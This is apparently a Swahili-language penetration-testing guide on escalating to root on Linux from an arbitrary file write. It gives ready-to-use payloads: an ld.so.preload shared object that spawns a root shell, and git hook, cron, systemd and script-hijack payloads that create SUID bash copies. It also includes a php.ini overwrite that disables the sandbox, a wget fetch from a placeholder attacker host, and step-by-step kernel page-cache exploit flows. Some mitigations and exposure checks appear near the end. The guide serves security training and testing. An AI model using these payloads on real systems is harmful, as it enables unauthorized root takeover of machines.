# Kuandika Faili Yoyote kwa Root

### /etc/ld.so.preload

`/etc/ld.so.preload` ni orodha ya mfumo mzima ya shared objects ambazo dynamic linker hupakia kabla ya shared objects nyingine. Secure-execution mode huweka vizuizi vya ziada kwenye preloading, hivyo library path kama `/tmp/pe.so` si mbinu ya SUID-binary inayofanya kazi kwa kila hali.\
Ikiwa unaweza kuunda au kurekebisha faili hii, process inayopakia faili hiyo itapakia library iliyoorodheshwa kabla ya shared objects zake nyingine, na hivyo kuruhusu code execution katika context ya process hiyo.<sup>[[12]](#references)</sup>

Kwa mfano: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** ni script zinazoweza kutekelezwa kwa ajili ya matukio katika repository, yakiwemo shughuli za commit na merge. Ikiwa **script au user mwenye privileges** anatekeleza shughuli hizo na attacker anaweza **kuandika ndani ya folder la `.git`**, hook inaweza kutumiwa kwa **privilege escalation**.<sup>[[13]](#references)</sup>

Kwa mfano, inawezekana **kutengeneza script** katika git repo ndani ya **`.git/hooks`** ili itekelezwe kila mara commit mpya inapoundwa:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Cron na faili za muda

Ikiwa unaweza **kuandika faili zinazohusiana na cron ambazo root huzitekeleza**, kwa kawaida unaweza kupata code execution mara nyingine job inapotekelezwa. Malengo ya kuvutia ni pamoja na:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Crontab ya root katika `/var/spool/cron/` au `/var/spool/cron/crontabs/`
- Timers za `systemd` na services zinazoanzishwa nazo

Ukaguzi wa haraka:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Njia za kawaida za matumizi mabaya:

- **Kuongeza cron job mpya ya root** kwenye `/etc/crontab` au faili katika `/etc/cron.d/`
- **Kubadilisha script** ambayo tayari inatekelezwa na `run-parts`
- **Kuweka backdoor kwenye timer target iliyopo** kwa kurekebisha script au binary ambayo inazinduliwa

Mfano mdogo wa cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Ikiwa unaweza kuandika tu ndani ya saraka ya cron inayotumiwa na `run-parts`, weka faili inayoweza kutekelezwa humo badala yake:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes:

- `run-parts` kwa kawaida hupuuza majina ya faili yaliyo na nukta, hivyo pendelea majina kama `backup` badala ya `backup.sh`.<sup>[[15]](#references)</sup>
- Baadhi ya systems hutumia `systemd` timers badala ya cron ya kawaida, lakini wazo la matumizi mabaya ni lilelile: **rekebisha kitakachotekelezwa na root baadaye**.<sup>[[20]](#references)</sup>

### Faili za Service na Socket

Ikiwa unaweza kuandika **`systemd` unit files** au faili zinazorejelewa nazo, unaweza kupata code execution kama root kwa kureload na kurestart unit, au kwa kusubiri service/socket activation path i-trigger.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Targets zinazovutia ni pamoja na:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides katika `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries zinazorejelewa na `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- `EnvironmentFile=` paths zinazoweza kuandikwa na zinazopakiwa na root service

Ukaguzi wa haraka:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Njia za kawaida za abuse:

- **Andika juu ya `ExecStart=`** katika service unit inayomilikiwa na root unayoweza kuhariri
- **Ongeza drop-in override** yenye `ExecStart=` hasidi na uondoe ya zamani kwanza
- **Backdoor script/binary** ambayo tayari imetajwa na unit
- **Hijack socket-activated service** kwa kurekebisha faili ya `.service` inayolingana, ambayo huanza socket inapopokea connection

Mfano wa override hasidi:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Mtiririko wa kawaida wa uanzishaji:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Ikiwa huwezi kuanzisha upya services mwenyewe lakini unaweza kuhariri unit iliyoamilishwa na socket, huenda ukahitaji tu **kusubiri muunganisho wa client** ili kuanzisha utekelezaji wa service iliyo na backdoor kama root.<sup>[[17]](#references)</sup>

### Overwrite `php.ini` yenye vizuizi inayotumiwa na PHP sandbox yenye privileges

Baadhi ya daemons maalum huthibitisha PHP inayotolewa na mtumiaji kwa kuendesha `php` yenye **`php.ini` yenye vizuizi** (kwa mfano, `disable_functions=exec,system,...`). Ikiwa code iliyo kwenye sandbox bado ina **primitive yoyote ya kuandika** (kama `file_put_contents`) na unaweza kufikia **path kamili ya `php.ini`** inayotumiwa na daemon, unaweza **kuandika upya config hiyo** ili kuondoa vizuizi, kisha utume payload ya pili inayotekelezwa kwa privileges zilizoinuliwa.<sup>[[2]](#references)</sup>

Mtiririko wa kawaida:

1. Payload ya kwanza huandika upya sandbox config.
2. Payload ya pili hutekeleza code baada ya dangerous functions kuwezeshwa tena.

Mfano mdogo (badilisha path inayotumiwa na daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Ikiwa daemon inaendesha kama root (au inathibitisha kwa kutumia paths zinazomilikiwa na root), utekelezaji wa pili hutoa root context. Hii kimsingi ni **privilege escalation via config overwrite** wakati sandboxed runtime bado inaweza kuandika files.

### binfmt_misc

`binfmt_misc` hufichua registrations chini ya `/proc/sys/fs/binfmt_misc`; kila registration huhusisha pattern ya aina ya file na interpreter. Athari ya privilege hutegemea ni nani anayeweza kubadilisha registration na ni process gani baadaye hutekeleza file linalolingana, kwa hivyo thibitisha masharti hayo kabla ya kuichukulia kama njia ya privilege escalation.<sup>[[21]](#references)</sup>

### Overwrite schema handlers (kama http: au https:)

Desktop environments hutumia MIME associations na desktop entries kuchagua application kwa URI schemes; attacker anayeweza kuandika per-user configuration na desktop-entry directories husika anaweza kuelekeza schemes hizo kwenye launcher anayoidhibiti. Kwa kurekebisha file ya `$HOME/.config/mimeapps.list` ili kuelekeza HTTP na HTTPS URL handlers kwenye file malicious (kwa mfano, `x-scheme-handler/http=evil.desktop` na `x-scheme-handler/https=evil.desktop`), click ya user inaweza ku-invoke desktop entry hiyo.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Scripts/binaries zinazoweza kuandikwa na user zinazoendeshwa na Root

Ikiwa privileged workflow inaendesha kitu kama `/bin/sh /home/username/.../script` (au binary yoyote iliyo ndani ya directory inayomilikiwa na user asiye na privileges), unaweza kuiteka:<sup>[[1]](#references)</sup>

- **Tambua execution:** monitor processes kwa kutumia pspy ili kunasa Root iki-invoke paths zinazodhibitiwa na user.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Thibitisha uwezo wa kuandika:** hakikisha faili lengwa na directory yake vinamilikiwa na vinaweza kuandikwa na user wako.
- **Hijack target:** hifadhi nakala ya binary/script ya awali na weka payload inayounda SUID shell (au root action nyingine yoyote), kisha rudisha permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (k.m., kubonyeza kitufe cha UI kinachozindua helper). Root itakapoendesha tena path iliyotekwa, pata shell iliyoinuliwa kwa `./rootshell -p`.

### Page-cache-only file modification of privileged binaries

Baadhi ya kernel bugs hazibadilishi file **kwenye disk**. Badala yake, zinakuruhusu kubadilisha tu **nakala ya page cache** ya file inayoweza kusomeka. Ikiwa unaweza kulenga binary yenye **setuid** au file nyingine inayoendeshwa na **root**, execution inayofuata inaweza kuendesha bytes zinazodhibitiwa na attacker kutoka kwenye memory na kuinua privileges, ingawa file hash iliyo kwenye disk haijabadilika.<sup>[[3]](#references)[[4]](#references)</sup>

Ni muhimu kufikiria hili kama **runtime-only file write primitive**:<sup>[[3]](#references)</sup>

- **Disk inabaki safi**: inode na bytes zilizo kwenye disk hazibadiliki
- **Memory ni dirty**: processes zinazosoma au ku-execute page iliyowekwa kwenye cache hupata content iliyobadilishwa na attacker
- **Athari ni ya muda**: mabadiliko hupotea baada ya reboot au cache eviction

Primitive hii iko kati ya **arbitrary file write** ya kawaida na bugs za zamani za **page-cache abuse** kama Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW ilitegemea race
- Dirty Pipe ilikuwa na constraints za write-position
- Primitive ya page-cache-only inaweza kuwa ya kuaminika zaidi ikiwa vulnerable path inatoa writes za moja kwa moja kwenye cached file-backed pages

#### Generic privesc flow

1. Pata kernel primitive inayoweza kuandika kwenye **file-backed page cache pages**
2. Itumie dhidi ya **readable privileged binary** au file nyingine inayoendeshwa na root
3. Trigger execution **kabla** ya page kuondolewa kwenye cache
4. Pata code execution kama root huku file iliyo kwenye disk ikiendelea kuonekana haijabadilishwa

Typical high-value targets:

- Binaries za **setuid-root**
- Helpers zinazozinduliwa na **root services**
- Binaries zinazoendeshwa mara kwa mara kutoka kwenye **containers zinazoshiriki host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) ni mfano mzuri wa class hii. Vulnerable path ilikuwa kwenye Linux crypto userspace API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` inaweza kuhamisha references za page-cache pages kutoka kwenye file linaloweza kusomeka kwenda kwenye crypto TX scatterlist
- in-place `algif_aead` decrypt path ilitumia tena source na destination buffers
- `authencesn` kisha iliandika kwenye destination tag region
- region hiyo ilipokuwa bado inareference file-backed pages zilizokuwa zimespliciwa, write iliingia kwenye **page cache ya target file**

Kwa hiyo, technique ya kuvutia si CVE yenyewe, bali pattern hii:

- **feed file-backed cache pages into a kernel subsystem**
- ifanye subsystem **izichukulie kama writable output**
- trigger overwrite ndogo inayodhibitiwa kwenye memory

Public PoC ilitumia **4-byte writes** zilizorudiwa ku-patch `/usr/bin/su` kwenye memory, kisha ika-execute file hiyo.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) inaonyesha variant nyingine ya pattern hiyo hiyo ya **page-cache-only write-to-root**, lakini wakati huu sink ni **IPsec ESP decrypt** badala ya `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Technique muhimu ni **metadata-laundering step**:

- `splice()` inaweka **read-only file-backed page-cache page** ndani ya ESP-in-UDP packet
- mitigation ya awali ya DirtyFrag iliweka tag `SKBFL_SHARED_FRAG` kwenye skb ili `esp_input()` ifanye **copy kabla ya decrypting**
- netfilter `TEE` inaduplika packet kupitia `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone inahifadhi **reference ile ile ya physical page-cache**, lakini inapoteza `SKBFL_SHARED_FRAG`
- `esp_input()` kisha inaichukulia clone kama salama na inaendesha **in-place `cbc(aes)` decrypt** juu ya file-backed page

Kwa hiyo, somo kwa reviewer ni pana zaidi ya CVE: ikiwa mitigation inategemea **skb/page metadata** kuamua kama operation lazima ifanye copy kwanza, **clone/copy path** yoyote inayohifadhi backing page lakini ikaondoa metadata inaweza kufungua tena write primitive bila kutambuliwa.

Typical exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` ili kupata **`CAP_NET_ADMIN` ndani ya private network namespace**
2. washa loopback na uweke **netfilter `TEE` rule** kwenye `mangle/OUTPUT`
3. weka **XFRM ESP transport SAs** kupitia `NETLINK_XFRM`
4. encode kila target 4-byte word kwenye SA `seq_hi` field (word-selection trick ya DirtyFrag)
5. tuma spliced ESP-in-UDP packet ili **TEE clone** ifikie `esp_input()` na ifanye decrypt **in place**
6. rudia hadi nakala ya page-cache ya `/usr/bin/su` au executable nyingine ya privileged iwe na code inayodhibitiwa na attacker

Kwa upande wa uendeshaji, impact ni sawa na mfano wa `AF_ALG`: file iliyo kwenye disk inabaki safi, lakini `execve()` inatumia **bytes za page-cache zilizobadilishwa** na kutoa root.<sup>[[8]](#references)[[9]](#references)</sup>

Useful exposure checks for this variant:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Upunguzaji wa attack surface wa muda mfupi pia ni mahususi kwa path hapa: kuboresha hadi kernel iliyo na `48f6a5356a33` hurekebisha clone path, huku kuzuia autoload ya `xt_TEE` kunaondoa **flag-laundering step**, na kuzuia `esp4` / `esp6` kunaondoa **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Mfiduo na hunting

Ikiwa unashuku aina hii ya bug, usitegemee tu ukaguzi wa uadilifu wa diski. Pia thibitisha:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Thamani za usanidi zilizo hapa chini zinatofautisha interface inayoweza kupakiwa na ile iliyojengwa ndani ya kernel; sheria za ujenzi wa crypto huunganisha `CONFIG_CRYPTO_USER_API_AEAD` na `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` inaweza kupakiwa/kupakuliwa kama module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface imejengwa ndani ya kernel
- binaries za setuid ni targets nzuri kwa sababu patch inayohusu page-cache pekee inaweza kutosha kubadilisha foothold ya ndani kuwa root

#### Kupunguza attack surface ya njia ya `algif_aead`

Ikiwa interface yenye vulnerability imetolewa na module inayoweza kupakiwa:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Ikiwa imejengwa ndani ya kernel, baadhi ya disclosures ziliripoti kuzuia init path kwa:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Aina hii ya mitigation inafaa kukumbukwa pia kwa kernel LPE nyingine: ikiwa exploitation inategemea interface fulani ya hiari, ku-disable au ku-blacklist interface hiyo kunaweza kuvunja njia ya exploit hata kabla full kernel upgrade haijapatikana.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – hijacking script inayotekelezwa na root katika directory ya PaperCut inayoweza kuandikwa na user](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: FAQ ya Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Ufichuzi wa Openwall oss-security kuhusu CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory ya CVE-2026-31431](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Kuchanganua na kutumia Linux LPE variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: preserve `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: set `SKBFL_SHARED_FRAG` for spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Documentation ya Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Vulnerability ya AF_ALG page cache katika Linux kernel](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
